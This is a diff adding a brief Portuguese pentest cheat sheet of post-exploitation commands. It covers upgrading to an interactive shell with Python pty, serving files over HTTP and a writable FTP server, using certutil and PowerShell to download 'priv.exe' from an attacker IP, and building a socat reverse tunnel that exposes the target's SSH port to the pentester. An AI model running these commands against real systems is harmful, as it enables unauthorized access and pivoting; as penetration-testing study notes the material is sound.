@@ -1,0 +1,42 @@
+Ganhando shell interatica com python:
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Criando servidores para download:
+
+    Usando apache
+
+        systemctl start apache2 (/var/www/http/file.exe)
+
+    Usando Python2
+
+        python -m SimpleHTTPServer 80
+
+    Usando Python3
+
+        python3 -m http.server 80
+
+Fazendo download de arquivos:
+
+    Windows
+
+        Certutil.exe -urlcache -f http://192.168.1.16/priv.exe priv.exe
+
+        powershell.exe wget http://192.168.1.16/priv.exe -OutFile priv.exe
+
+Subindo um servidor FTP:
+
+    pip install pyftpdlib
+    python -m pyftpdlib -p 21 --write
+
+Tunelamento Linux usando SOCAT:
+
+    alvo ------> socat TCP4:IP-PENTESTER:8443 TCP4:127.0.0.1:22
+    # Comando acima envia o tráfego da porta 22 local para a porta 8443 do pentester.
+    
+    Pentester -> socat TCP4-LISTEN:8443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr
+    # O comando acima deixa a porta 8443 escutando e direciona o que vir nela para
+    # a porta 2222.
+    # Após o tunel ser estabelecido a porta 2222 local do pentester vai ter o
+    # serviço vindo do alvo.
+
+    
